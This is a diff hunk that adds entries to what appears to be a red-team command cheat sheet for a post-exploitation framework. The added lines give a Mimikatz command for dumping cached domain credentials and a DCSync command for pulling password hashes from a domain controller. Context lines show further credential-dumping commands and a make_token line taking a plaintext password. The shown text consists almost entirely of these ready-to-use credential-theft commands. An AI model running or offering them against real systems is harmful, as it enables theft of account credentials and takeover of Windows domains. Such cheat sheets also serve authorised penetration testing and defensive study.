@@ -322,6 +322,16 @@ mimikatz !sekurlsa::ekeys
 mimikatz !lsadump::sam
 ```
 
+#### Mimikatz Cached Credentials
+```
+mimikatz !lsadump::cache
+```
+
+#### DCSync
+```
+dcsync <DOMAIN> <DOMAIN\USER>
+```
+
 #### Make token - runas other user
 ```
 make_token <DOMAIN>\<USER> <PASSWORD>
